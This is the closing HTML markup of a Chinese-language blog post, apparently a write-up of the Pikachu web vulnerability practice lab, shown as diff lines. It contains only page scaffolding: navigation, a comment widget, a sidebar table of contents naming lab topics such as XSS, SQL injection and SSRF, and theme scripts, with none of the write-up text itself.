+    <a href="/archives/Principles-Of-Computer-Networks-Experiment-5.html" rel="prev" title="计算机网络原理实验五──地址转换NAT">
+      <i class="fa fa-chevron-left"></i> 计算机网络原理实验五──地址转换NAT
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/archives/CTF-Show-Get-Started-with-the-web-collect-info.html" rel="next" title="【Klee-CTF】CTF.Show Web入门 信息收集">
+      【Klee-CTF】CTF.Show Web入门 信息收集 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E8%B5%84%E6%96%99"><span class="nav-number">1.</span> <span class="nav-text">准备资料</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">2.</span> <span class="nav-text">暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E7%A0%B4%E8%A7%A3"><span class="nav-number">2.1.</span> <span class="nav-text">基于表单的破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server"><span class="nav-number">2.2.</span> <span class="nav-text">验证码绕过 (on server)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%88get%EF%BC%89-%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-number">3.</span> <span class="nav-text">反射型xss（get）&#x2F; 存储型xss</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">搜索型注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-boolian-%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.</span> <span class="nav-text">基于 boolian 的盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">6.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exec-%E2%80%9Cping%E2%80%9D"><span class="nav-number">7.</span> <span class="nav-text">exec “ping”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#File-Inclusion-remote"><span class="nav-number">8.</span> <span class="nav-text">File Inclusion(remote)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unsafe-Filedownload"><span class="nav-number">9.</span> <span class="nav-text">Unsafe Filedownload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unsafe-Fileupload%E2%86%92client-check"><span class="nav-number">10.</span> <span class="nav-text">Unsafe Fileupload→client check</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Over-Permission"><span class="nav-number">11.</span> <span class="nav-text">Over Permission</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E2%86%92%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">12.</span> <span class="nav-text">..&#x2F;..&#x2F;→目录遍历</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E2%86%92IcanseeyourABC"><span class="nav-number">13.</span> <span class="nav-text">敏感信息泄露→IcanseeyourABC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">14.</span> <span class="nav-text">PHP 反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="nav-number">15.</span> <span class="nav-text">XXE漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#URL-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">16.</span> <span class="nav-text">URL 重定向</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF-curl"><span class="nav-number">17.</span> <span class="nav-text">SSRF(curl)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%8D%E7%9B%98"><span class="nav-number">18.</span> <span class="nav-text">复盘</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Guoguo"
+      src="https://guo.moe/favicon.jpg">
+  <p class="site-author-name" itemprop="name">Guoguo</p>
+  <div class="site-description" itemprop="description">找不到路，就自己走一条出来。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/imguoguo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;imguoguo" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:blog@guo.moe" title="E-Mail → mailto:blog@guo.moe"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guoguo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/medium-zoom.min.js"></script>
+  <script src="/lib/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', () => {
+    window.dsqjs = new DisqusJS({
+      api       : 'https://disqus.guo.moe/api/' || 'https://disqus.com/api/',
+      apikey    : 'TRTXJqZLCwf51OCjLAd1u320K7DxrMxK37Ch9X2xFXy5Q4d2gdVBKeMT33qizKh9',
+      shortname : 'guoguoblog',
+      url       : "https://guo.moe/archives/Pikachu-exercise.html",
+      identifier: "archives/Pikachu-exercise.html",
+      title     : "【Klee-CTF】 Pikachu 漏洞练习",
+    });
+  }, window.DisqusJS);
+});
+</script>
+
+    </div>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
